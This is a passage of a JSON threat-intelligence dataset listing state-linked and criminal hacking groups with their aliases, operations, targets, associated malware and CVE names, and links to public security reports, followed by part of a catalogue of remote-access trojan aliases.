["https://digitasecurity.com/blog/2018/12/20/windtail/", "https://objective-see.com/blog/blog_0x38.html", "https://unit42.paloaltonetworks.com/shifting-in-the-wind-windshift-attacks-target-middle-eastern-governments/", "https://gsec.hitb.org/materials/sg2018/D1%20COMMSEC%20-%20In%20the%20Trails%20of%20WINDSHIFT%20APT%20-%20Taha%20Karim.pdf"], "tools": ["WindTail", "WindTape"], "targets": "Gulf Cooperation Council", "description": null}, {"operations": ["Bank of Valletta"], "comment": "Criminal, overlap with FIN7 & Carbanak", "attck_id": null, "names": ["CobaltGoblin", "EmpireMonkey"], "links": ["http://blog.morphisec.com/new-global-attack-on-point-of-sale-systems", "https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/", "https://www.timesofmalta.com/articles/view/20190225/local/how-bov-hackers-got-away-with-13-million.702800"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Pacha Group"], "links": ["https://www.intezer.com/blog-technical-analysis-pacha-group/", "https://www.intezer.com/blog-pacha-group-deploying-undetected-cryptojacking-campaigns/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["DNSpionage"], "links": ["https://blog-cert.opmd.fr/dnspionage-retour-factuel-sur-les-attaques-annoncees-dans-differents-medias/", "https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html", "https://twitter.com/_CPResearch_/status/1103525899515973632", "https://blog-cert.opmd.fr/dnspionage-weird-apt32-stuff/", "https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html"], "tools": [], "targets": "Lebanon, UAE", "description": null}, {"operations": ["Hellsing"], "comment": null, "attck_id": null, "names": ["DeadlyKiss", "TwoForOne", "PLATINUM"], "links": ["http://arstechnica.com/security/2015/04/elite-cyber-crime-group-strikes-back-after-attack-by-rival-apt-gang/", "https://www.microsoft.com/security/blog/2017/06/07/platinum-continues-to-evolve-find-ways-to-maintain-invisibility/?source=mmpc", "http://download.microsoft.com/download/2/2/5/225BFE3E-E1DE-4F5B-A77B-71200928D209/Platinum%20feature%20article%20-%20Targeted%20attacks%20in%20South%20and%20Southeast%20Asia%20April%202016.pdf", "https://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back/", "https://threatpost.com/platinum-apt-first-to-abuse-intel-chip-management-feature/126166/", "https://securelist.com/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back/", "https://blogs.technet.microsoft.com/mmpc/2016/04/26/digging-deep-for-platinum/", "https://blog.telsy.com/deadlykiss-malware/", "https://securelist.com/titanium-the-platinum-group-strikes-again/"], "tools": ["Hotpatching techniques", "CVE-2015-2545", "AMT Feature FW evasion"], "targets": "primarily targets governmental organizations, defense institutes, intelligence agencies, and telecommunication providers in South and Southeast Asia", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["GreyEnergy Group"], "links": ["https://www.fireeye.com/blog/threat-research/2018/07/microsoft-office-vulnerabilities-used-to-distribute-felixroot-backdoor.html", "https://www.nozominetworks.com/resources/research-paper/greyenergy-dissecting-the-malware-from-maldoc-to-backdoor-2/", "https://github.com/NozomiNetworks/greyenergy-unpacker", "https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf"], "tools": ["Maldoc", "GreyEnergy Dropper", "GreyEnergy Min/FELIXROOT"], "targets": "Industries: Energy (in Ukraine & Eastern Europe)", "description": null}]}}, {"nato": {"actors": [{"operations": ["Olympic Games / Stuxnet"], "comment": "Collaborative umbrella of varioius threat actors", "attck_id": null, "names": ["GOSSIPGIRL"], "links": ["https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0"], "tools": ["Flame", "Stuxnet", "Miniflame", "Duqu", "Gauss"], "targets": null, "description": null}, {"operations": ["Socialist", "Olympic Games / Stuxnet", "Project Sauron / Strider"], "comment": "NSA, GCHQ, CSIS, ASIS, GCSB, FiveEyes, FVEY", "attck_id": null, "names": ["Housefly", "EQGRP", "Tilded Team", "Remsec", "Longhorn", "Lamberts", "Equation Group"], "links": ["https://securelist.com/darkuniverse-the-mysterious-apt-framework-27/94897/", "https://web.archive.org/web/20160304022846/http://www.kaspersky.com/about/news/virus/2012/Kaspersky_Lab_and_ITU_Discover_Gauss_A_New_Complex_Cyber_Threat_Designed_to_Monitor_Online_Banking_Accounts", "https://twitter.com/RedDrip7/status/1178511323954434048", "https://securelist.com/analysis/publications/75533/faq-the-projectsauron-apt/", "https://www.bleepingcomputer.com/news/security/longhorn-cyber-espionage-group-is-actually-the-cia/", "http://www.symantec.com/connect/blogs/strider-cyberespionage-group-turns-eye-sauron-targets", "http://securelist.com/blog/research/67741/regin-nation-state-ownage-of-gsm-networks/", "https://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/"], "tools": ["Regin", "EquationLaser", "EquationDrug", "DoubleFantasy", "TripleFantasy", "Fanny", "Grayfish", "RemSec", "Gauss"], "targets": null, "description": null}, {"operations": [], "comment": "Probably French origins", "attck_id": null, "names": ["Animal Farm", "Snowglobe"], "links": ["http://www.cyphort.com/babar-suspected-nation-state-spyware-spotlight/", "https://blog.gdatasoftware.com/blog/article/babar-espionage-software-finally-found-and-put-under-the-microscope.html", "http://www.cyphort.com/evilbunny-malware-instrumented-lua/", "https://securelist.com/blog/research/69114/animals-in-the-apt-farm/", "https://motherboard.vice.com/read/meet-babar-a-new-malware-almost-certainly-created-by-france"], "tools": ["Babar", "Bunny", "Dino", "Casper", "Tafacalou", "NBot", "Chocopop"], "targets": null, "description": null}, {"operations": ["Mikrotik Router Compromise"], "comment": null, "attck_id": null, "names": ["Slingshot"], "links": ["https://securelist.com/apt-slingshot/84312/"], "tools": ["Slingshot", "Cahnadr", "GollumApp", "SsCB", "ffproxy", "NeedleWatch", "Sfc2", "Minisling", "Spork downloader"], "targets": "Kenya, Yemen, Libya, Afghanistan, Iraq, Tanzania, Jordan, Mauritius, Somalia, Democratic Republic of the Congo, Turkey, Sudan and United Arab Emirates", "description": null}, {"operations": ["Project Tajmahal"], "comment": null, "attck_id": null, "names": ["?"], "links": ["https://securelist.com/project-tajmahal/90240/"], "tools": ["full-blown spying framework consists of two packages named \u2018Tokyo\u2019 and \u2018Yokohama"], "targets": "single victim \u2013 a diplomatic entity from a country in Central Asia", "description": null}, {"operations": ["Sea Turtle"], "comment": "Turkish threat group", "attck_id": null, "names": ["Sea Turtle"], "links": ["https://www.reuters.com/article/us-cyber-attack-hijack-exclusive/exclusive-hackers-acting-in-turkeys-interests-believed-to-be-behind-recent-cyberattacks-sources-idUSKBN1ZQ10X", "https://blog.talosintelligence.com/2019/04/seaturtle.html", "https://blog.talosintelligence.com/2019/07/sea-turtle-keeps-on-swimming.html"], "tools": ["DNS hijacking", "CVE-2009-1151", "CVE-2014-6271", "CVE-2017-3881", "CVE-2017-6736", "CVE-2017-12617", "CVE-2018-0296", "CVE-2018-7600", "Drupalgeddon"], "targets": "industries: Ministries of foreign affairs, Military organizations, Intelligence agencies, Prominent energy organizations in US, Libya, Egypt, Lebanon, UAE, Albania, Cyprus, Turkey, Iraq, Jordan, Syria, Armenia, Sweden", "description": null}, {"operations": [], "comment": "CIA ", "attck_id": null, "names": ["APT-C-39"], "links": ["http://blogs.360.cn/post/APT-C-39_CIA_EN.html"], "tools": ["Vault7"], "targets": "PRC", "description": null}]}}, {"russia": {"actors": [{"operations": [" Russian Doll", "Bundestag", "TV5 Monde \"Cyber Caliphate\"", "EFF Attack", "DNC Hack", "OpOlympics", "Burisma"], "comment": "Called out by DHS & FBI as responsible for cyber attacks associated with US election 2016.Allegedly attributed the first UEFI rootkit seen in the wild: LoJax (2018)", "attck_id": null, "names": ["Pawn Storm", "Sednit", "APT28", "Strontium", "Fancy Bear", "Tsar Team", "Group 74", "SIG40", "Swallowtail", "Sofacy", "Grizzly Steppe", "IRON TWILIGHT"], "links": ["https://www.crowdstrike.com/blog/danger-close-fancy-bear-tracking-ukrainian-field-artillery-units/", "https://www.us-cert.gov/sites/default/files/publications/JAR_16-20296.pdf", "https://blog.trendmicro.com/trendlabs-security-intelligence/update-pawn-storm-new-targets-politically-motivated-campaigns/", "https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/", "https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/", "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/", "http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-pawn-storm.pdf", "https://www2.fireeye.com/rs/848-DID-242/images/wp-mandiant-matryoshka-mining.pdf", "https://app.box.com/s/g55oxdd3q63hyngbjm4fbipfct94wrye", "https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/", "https://aptnotes.malwareconfig.com/web/viewer.html?file=../APTnotes/2014/apt28.pdf", "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/", "http://fancybear.net/", "http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html", "http://researchcenter.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/", "https://securelist.com/a-slice-of-2017-sofacy-activity/83930/", "https://securelist.com/masha-and-these-bears/84311/", "https://www.us-cert.gov/sites/default/files/publications/AR-17-20045_Enhanced_Analysis_of_GRIZZLY_STEPPE_Activity.pdf", "https://apnews.com/3bca5267d4544508bb523fa0db462cb2?utm_campaign=SocialFlow&utm_source=Twitter&utm_medium=AP", "https://cdn.area1security.com/reports/Area-1-Security-PhishingBarismaHoldings.pdf", "http://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/", "http://www.welivesecurity.com/2016/10/20/new-eset-research-paper-puts-sednit-under-the-microscope/"], "tools": ["CHOPSTICK", "CORESHELL", "Winexe", "SOURFACE", "OLDBAIT", "Sofacy", "XAgent", "XTunnel", "WinIDS", "Foozer", "DownRange", "Sedreco Dropper", "Komplex", "DealersChoice", "Downdelph", "Sednit", "USBStealer", "Sedkit", "HideDrv (Rootkit)", "LoJax"], "targets": "United States government", "description": null}, {"operations": ["Operation Ghost"], "comment": "Active campaign post 2016 US presidential election", "attck_id": null, "names": ["Cozy Duke", "Group 100", "Dukes", "Cozer", "CozyCar", "Cozy Bear", "EuroAPT", "Minidionis", "Office Monkeys / TEMP.Monkeys", "APT29", "Fritillary", "Hammer Toss", "SeaDuke", "IRON HEMLOCK"], "links": ["https://www.us-cert.gov/sites/default/files/publications/AR-17-20045_Enhanced_Analysis_of_GRIZZLY_STEPPE_Activity.pdf", "https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf", "http://www.volexity.com/blog/", "https://labsblog.f-secure.com/2015/09/17/the-dukes-7-years-of-russian-cyber-espionage/", "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/", "https://aptnotes.malwareconfig.com/web/viewer.html?file=../APTnotes/2015/apt29-hammertoss-stealthy-tactics-define-a.pdf", "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html", "https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html", "https://www2.fireeye.com/rs/848-DID-242/images/RPT-M-Trends-2017.pdf", "https://securelist.com/the-cozyduke-apt/69731/", "https://www.welivesecurity.com/2019/10/17/operation-ghost-dukes-never-left/"], "tools": ["Hammertoss", "OnionDuke", "CosmicDuke", "MiniDuke", "CozyDuke", "SeaDuke", "SeaDaddy implant developed in Python and compiled with py2exe", "AdobeARM", "ATI-Agent", "MiniDionis", "Grizzly Steppe", "Vernaldrop", "Tadpole", "Spikerush", "POSHSPY", "PolyglotDuke", "RegDuke", "FatDuke"], "targets": "This threat actor targets government ministries and agencies in Europe, the US, Central Asia, East Africa, and the Middle East, associated with DNC attacks", "description": "phishing emails"}, {"operations": ["Satellite Turla", "Epic Turla", "The 'Penquin' Turla", "Witchcoven", "RUAG hack", "Mosquito", "Moonlight Maze"], "comment": "Turla also uses OilRig's (APT34) implants ", "attck_id": null, "names": ["Group 88", "Venomous Bear", "Snake", "Uroburos", "Krypton", "Turla Team", "Waterbug", "MAKERSMARK", "SIG23", "Turla Group ", "ITG12", "IRON HUNTER"], "links": ["http://www.sueddeutsche.de/digital/it-sicherheit-einbrechen-ausbreiten-abgreifen-1.3887843", "https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/", "https://www.wired.com/2017/04/russian-hackers-used-backdoor-two-decades/", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-march-venomous-bear/", "https://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments", "https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/", "https://www2.fireeye.com/rs/848-DID-242/images/rpt-witchcoven.pdf", "https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf", "https://securelist.com/blog/research/72081/satellite-turla-apt-command-and-control-in-the-sky/", "https://securelist.com/blog/research/67962/the-penquin-turla-2/", "https://securelist.com/analysis/publications/65545/the-epic-turla-operation/", "https://securelist.com/kopiluwak-a-new-javascript-payload-from-turla/77429/", "https://www.proofpoint.com/us/threat-insight/post/turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack", "https://motherboard.vice.com/en_us/article/vvk83b/moonlight-maze-turla-link", "https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0", "https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/", "https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/", "https://securelist.com/shedding-skin-turlas-fresh-faces/88069/", "https://www.ncsc.gov.uk/alerts/turla-group-malware", "https://www.ncsc.gov.uk/news/turla-group-exploits-iran-apt-to-expand-coverage-of-victims", "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf", "https://twitter.com/lehtior2/status/893085897226412036", "https://www.welivesecurity.com/2017/08/30/eset-research-cyberespionage-gazer/", "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"], "tools": ["systeminfo", "net", "tasklist", "gpresult", "wce", "pwdump", "Uroburos", "Turla", "Agent.BTZ", "Tavdig", "Wipbot", "Agent.dne", "AdobeARM", "ATI-Agent", "MiniDionis", "WhiteBear", "Gazer", "Neuron", "Nautilus"], "targets": "Targeting several governments and sensitive businesses such as the defense industry", "description": null}, {"operations": [], "comment": "Detected in Middle East networks in 2014, Compromise via spear phish or SWC, Motivation somewhat unclear", "attck_id": null, "names": ["Group 24", "Crouching Yeti", "Dragonfly", "Dymalloy", "Anger Bear", "Berserk Bear", "Koala Team", "PEACEPIPE", "Havex", "Energetic Bear", "Fertger", "IRON LIBERTY"], "links": ["https://www.secureworks.com/research/mcmd-malware-analysis", "https://www.secureworks.com/blog/own-the-router-own-the-traffic", "https://www.us-cert.gov/ncas/alerts/TA17-293A", "https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group", "https://securelist.com/blog/incidents/35520/the-teamspy-crew-attacks-abusing-teamviewer-for-cyberespionage-8/", "http://www.netresec.com/?page=Blog&month=2014-10&post=Full-Disclosure-of-Havex-Trojans", "https://threatpost.com/energy-watering-hole-attack-used-lightsout-exploit-kit/104772/", "http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf", "https://securelist.com/energetic-bear-crouching-yeti/85345/", "https://www.fireeye.com/content/dam/fireeye-www/company/events/infosec/threat-landscape-overview-fireeye-summit-paris.pdf", "https://threatmatrix.cylance.com/en_us/home/energetic-dragonfly-dymalloy-bear-2-0.html", "https://insights.sei.cmu.edu/cert/2019/03/api-hashing-tool-imagine-that.html", "https://www.secureworks.com/research/updated-karagany-malware-targets-energy-sector"], "tools": ["Havex RAT", "Oldrea", "LightsOut ExploitKit", "Inveigh", "PsExec", "Persistence through .LNK file manipulations", "Nmap", "Dirsearch", "Sqlmap", "Sublist3r", "Wpscan", "Impacket", "SMBTrap", "Commix", "Subbrute", "PHPMailer", "Web Shells (PHP)", "MCMD"], "targets": "This threat actor targets companies in the education, energy, construction, information technology, and pharmaceutical sectors for the purposes of espionage. It uses malware tailored to target industrial control systems. Energy, Middle East oil and natural gas as the goal, dedicated to gather relevant information, technology company in Western Europe that produces civil, military and critical infrastructure communications equipment", "description": "Active"}, {"operations": ["Black Energy", "Ukrenergo", "NPetya, NotPetya"], "comment": "Linked to Kiev Dec2016 ICS cyberattack", "attck_id": null, "names": ["Electrum", "TEMP.Noble", "Sandworm Team", "Black Energy", "BE2 APT", "Quedagh Group", "TeleBots", "Iridium", "Sandworm", "IRON VIKING"], "links": ["https://www.secureworks.com/research/resurgent-iron-liberty-targeting-energy-sector", "https://dragos.com/wp-content/uploads/CRASHOVERRIDE.pdf", "https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/", "https://www.us-cert.gov/ncas/alerts/TA17-163A", "https://ics.sans.org/blog/2016/01/09/confirmation-of-a-coordinated-attack-on-the-ukrainian-power-grid", "http://www.isightpartners.com/2016/01/ukraine-and-sandworm-team/", "https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf", "http://www.isightpartners.com/2014/10/cve-2014-4114/", "https://securelist.com/blackenergy-apt-attacks-in-ukraine-employ-spearphishing-with-word-documents/73440/", "https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/", "https://securelist.com/from-blackenergy-to-expetr/78937/", "https://securelist.com/greyenergys-overlap-with-zebrocy/89506/", "https://securelist.com/be2-extraordinary-plugins-siemens-targeting-dev-fails/68838/"], "tools": ["CVE-2014-4114", "Industroyer", "CrashOverride"], "targets": "This threat actor targets industrial control systems, using a tool called Black Energy, associated with electricity and power generation for espionage, denial of service, and data destruction purposes. ", "description": null}, {"operations": [], "comment": "Overlaps with Carbanak (but not the same group)", "attck_id": null, "names": ["Carbon Spider", "Anunak", "Carbanak", "FIN7"], "links": ["https://www.fortinet.com/blog/threat-research/bioload-fin7-boostwrite-lost-twin.html", "https://www.rsa.com/content/dam/premium/en/white-paper/the-shadows-of-ghosts-carbanak-report.pdf", "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html", "https://www.rsa.com/content/dam/en/white-paper/the-carbanak-fin7-syndicate.pdf", "https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor", "https://blog.cyber4sight.com/2017/04/similarities-between-carbanak-and-fin7-malware-suggest-actors-are-closely-related/", "https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns", "https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/", "https://securityaffairs.co/wordpress/64083/apt/fin7-new-techniques.html", "https://www.flashpoint-intel.com/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/", "https://www.fireeye.com/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html", "https://blog.malwarebytes.com/threat-analysis/2019/10/the-forgotten-domain-exploring-a-link-between-magecart-group-5-and-the-carbanak-apt/"], "tools": ["PowerSource"], "targets": "Bank of Valetta, Malta", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["FIN8"], "links": ["https://atr-blog.gigamon.com/2019/07/23/abadbabe-8badf00d-discovering-badhatch-and-a-detailed-look-at-fin8s-tooling/", "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html", "http://blog.morphisec.com/security-alert-fin8-is-back", "https://www.fireeye.com/blog/threat-research/2016/05/windows-zero-day-payment-cards.html", "https://www.root9b.com/sites/default/files/whitepapers/PoS%20Malware%20ShellTea%20PoSlurp_YARA.pdf", "https://unit42.paloaltonetworks.com/powersniff-malware-used-in-macro-based-attacks/"], "tools": ["PowerSniff", "PUNCHBUGGY", "PUNCHTRACK", "ShellTea", "BADHATCH", "PoSlurp"], "targets": "Hotel-Entertainment Industry, POS malware attack", "description": null}, {"operations": ["Red October", "Cloud Atlas"], "comment": null, "attck_id": null, "names": ["Inception Framework"], "links": ["https://securelist.com/recent-cloud-atlas-activity/92016/", "https://www.bluecoat.com/security-blog/2014-12-09/blue-coat-exposes-%E2%80%9C-inception-framework%E2%80%9D-very-sophisticated-layered-malware", "https://unit42.paloaltonetworks.com/unit42-inception-attackers-target-europe-year-old-office-vulnerability/", "http://securelist.com/blog/research/68083/cloud-atlas-redoctober-apt-is-back-in-style/", "https://www.symantec.com/blogs/threat-intelligence/inception-framework-hiding-behind-proxies", "https://securelist.com/blog/incidents/57647/the-red-october-campaign/"], "tools": [], "targets": "This threat actor targets governments and diplomatic organizations for espionage purposes. Suspected Operator in Ukraine working for Russia or its allies.", "description": null}, {"operations": ["TeamSpy"], "comment": null, "attck_id": null, "names": ["SIG39", "TeamSpy Crew"], "links": ["https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/", "http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/theteamspystory_final_t2.pdf"], "tools": ["Malicious TeamViewer versions", "JAVA RATs"], "targets": "This threat actor primarily compromises government entities and human rights activists in Eastern Europe and Central Asia for espionage purposes. It has also compromised private and public sector entities in the Middle East and in Western countries.", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Ratopak", "BuhTrap"], "links": ["https://www.netscout.com/blog/asert/diving-buhtrap-banking-trojan-activity", "https://www.welivesecurity.com/2019/07/11/buhtrap-zero-day-espionage-campaigns/", "http://www.welivesecurity.com/2015/11/11/operation-buhtrap-malware-distributed-via-ammyy-com/", "http://www.group-ib.com/brochures/gib-buhtrap-report.pdf", "https://www.welivesecurity.com/2015/04/09/operation-buhtrap/"], "tools": ["AmmyAdmin", "LURK", "NSIS", "Mimikatz", "CVE-2012-0158", "PuntoSwitcher (like Keylogger)"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Carberb"], "links": ["http://itlaw.wikia.com/wiki/Moonlight_Maze"], "tools": [], "targets": "USA", "description": null}, {"operations": ["RUAG Espionage"], "comment": null, "attck_id": null, "names": ["???"], "links": ["https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"], "tools": ["Turla Family", "Uroburos", "Snake (Carbon) Rootkit", "Tavdig/Wipbot/Epic", "Mimikatz", "dsquery", "dsget"], "targets": "Swiss defence department", "description": null}, {"operations": ["OP Armageddon", "Op Gamework"], "comment": "Hijack infrastructure of Iranian APT33, APT35 & Muddywater", "attck_id": null, "names": ["BlueAlpha", "Gamaredon Group", "FSB 16th & 18th Centers"], "links": ["https://www.recordedfuture.com/bluealpha-iranian-apts/", "http://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/", "https://blog.yoroi.company/research/the-russian-shadow-in-eastern-europe-ukrainian-mod-campaign/", "https://lookingglasscyber.com/wp-content/uploads/2015/08/Operation_Armageddon_FINAL.pdf"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "During Ukrainian Revolution", "attck_id": null, "names": ["Cyber Berkut"], "links": ["https://www.threatconnect.com/blog/russia-hacks-bellingcat-mh17-investigation/#.V-wnrubaeEU.twitter"], "tools": [], "targets": "Bellingcat", "description": null}, {"operations": [], "comment": "Associated with Turla", "attck_id": null, "names": ["Skipper Turla", "WhiteBear"], "links": ["https://securelist.com/introducing-whitebear/81638/"], "tools": ["Kopiluwak"], "targets": "embassies and diplomatic/foreign affair organizations, defense-related organizations", "description": null}, {"operations": ["BugDrop"], "comment": null, "attck_id": null, "names": ["???"], "links": ["https://cyberx-labs.com/en/blog/operation-bugdrop-cyberx-discovers-large-scale-cyber-reconnaissance-operation/"], "tools": [], "targets": "This threat actor targets critical infrastructure entities in the oil and gas sector, primarily in Ukraine. The threat actors deploy the BugDrop malware to remotely access the microphones in their targets' computers to eavesdrop on conversations.", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["GRU GTsST (Main Center for Special Technology)"], "links": ["https://www.washingtonpost.com/world/national-security/russian-military-was-behind-notpetya-cyberattack-in-ukraine-cia-concludes/2018/01/12/048d8506-f7ca-11e7-b34a-b85626af34ef_story.html?utm_term=.23e3c7810049"], "tools": ["NotPetya"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["VOODOO BEAR"], "links": ["https://securelist.com/olympic-destroyer-is-still-alive/86169/", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-january-voodoo-bear/", "https://securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "tools": ["OlympicDestroyer", "GreyEngergy Mini as their 1st-stage implant", "GCat"], "targets": "Ukrainian energy sector, Eastern Europe", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Triton", "Xenotime", "TEMP.Veles"], "links": ["https://www.fireeye.com/blog/threat-research/2018/06/totally-tubular-treatise-on-triton-and-tristation.html", "https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html", "https://www.fireeye.com/blog/threat-research/2019/04/triton-actor-ttp-profile-custom-attack-tools-detections.html", "https://dragos.com/resource/xenotime/", "https://dragos.com/resource/trisis-analyzing-safety-system-targeting-malware/", "https://www.fireeye.com/blog/threat-research/2018/10/triton-attribution-russian-government-owned-lab-most-likely-built-tools.html", "https://dragos.com/wp-content/uploads/NA-EL-Threat-Perspective-2019.pdf"], "tools": ["Triton"], "targets": "Oil refinery, other infrastructure", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Zebrocy", "Zebrocy"], "links": ["https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/", "https://securelist.com/zebrocys-multilanguage-malware-salad/90680/", "https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/", "https://unit42.paloaltonetworks.com/dear-joohn-sofacy-groups-global-campaign/", "https://securelist.com/a-zebrocy-go-downloader/89419/"], "tools": [], "targets": "Germany, Indonesia, the United States, Taiwan, India, France, Serbia, Ecuador, Argentina, South Korea, Japan, China, Britain, South Africa, Italy, Hong Kong, Romania, Ukraine, Macedonia, Russia, Switzerland, Senegal, the Philippines, UAE, Qatar, Saudi Arabia, Pakistan, Thailand, Bahrain, Turkey, Bulgaria, Bangladesh", "description": null}, {"operations": [], "comment": "TTP indicates possibly TA505", "attck_id": null, "names": ["SectorJ04"], "links": ["https://threatrecon.nshc.net/2019/08/29/sectorj04-groups-increased-activity-in-2019/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Operates from Union State & Ukraine", "attck_id": null, "names": ["FullofDeep"], "links": ["https://www.intezer.com/blog-russian-cybercrime-group-fullofdeep-behind-qnapcrypt-ransomware-campaigns/"], "tools": ["QNAPCrypt ransomware"], "targets": null, "description": null}]}}], "last_updated": "2020-03-11T16:11:53.769946", "tools": {"tools": [{"links": ["http://download01.norman.no/documents/ThemanyfacesofGh0stRat.pdf", "http://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-multi-year-campaign-involving-new-variant-of-gh0st-malware/", "https://sentinelone.com/blogs/the-curious-case-of-gh0st-malware/", "https://cysinfo.com/hunting-and-decrypting-communications-of-gh0st-rat-in-memory/"], "names": ["Zegost", "Piano Gh0st", "Moudoor", "Gh0st RAT"], "family": [], "comments": null}, {"links": ["http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf"], "names": ["PIVY", "Darkmoon", "Poison Ivy"], "family": [], "comments": null}, {"links": ["https://cysinfo.com/hunting-apt-rat-9002-in-memory-using-volatility-plugin/", "http://cybercampaigns.net/wp-content/uploads/2013/05/Hydraq.pdf"], "names": ["BKDR_MDMBOT", "Naid", "McRAT", "9002 RAT", "HydraQ"], "family": [], "comments": null}, {"links": [], "names": ["Gaolmay", "Matrix RAT", "Hikit"], "family": [], "comments": null}, {"links": ["https://blogs.cisco.com/security/talos/opening-zxshell", "http://pastebin.com/jCaLHvkM"], "names": ["Sensode", "Zxshell"], "family": [], "comments": null}, {"links": [], "names": ["Fexel", "DeputyDog"], "family": [], "comments": null}, {"links": ["https://www.circl.lu/pub/tr-24/", "http://labs.lastline.com/an-analysis-of-plugx", "http://blogs.cisco.com/security/talos/threat-spotlight-group-72"], "names": ["Kaba", "Korplug", "Sogu", "Thoper", "Destory RAT", "PlugX"], "family": ["PlugX"], "comments": "Often uses DLL side-loading"}, {"links": [], "names": ["BARYS", "Lecna", "BACKSPACe"], "family": [], "comments": null}, {"links": [], "names": ["QUERTY", "WarriorPride", "Prax", "Regin"], "family": [], "comments": "FEYES malware"}, {"links": [], "names": ["TokenControl", "HttpBrowser"], "family": [], "comments": null}, {"links": [], "names": ["Netfile", "RedStar", "TravNet", "NetTraveler"], "family": [], "comments": null}, {"links": ["https://securelist.com/blog/research/57331/the-icefog-apt-a-tale-of-cloak-and-three-daggers/", "http://www.kaspersky.com/about/news/virus/2013/Kaspersky_Lab_exposes_Icefog_a_new_cyber-espionage_campaign_focusing_on_supply_chain_attacks"], "names": ["Fucobha", "IceFog"], "family": [], "comments": null}, {"links": ["http://www.secureworks.com/cyber-threat-intelligence/threats/htran/"], "names": ["Xdoor", "ONHAT (similar)", "CTran", "HTran"], "family": [], "comments": "Chinese Tunneling Tool"}, {"links": ["http://cybercampaigns.net/wp-content/uploads/2013/05/Agent-BTZ.pdf"], "names": ["SillyFDC", 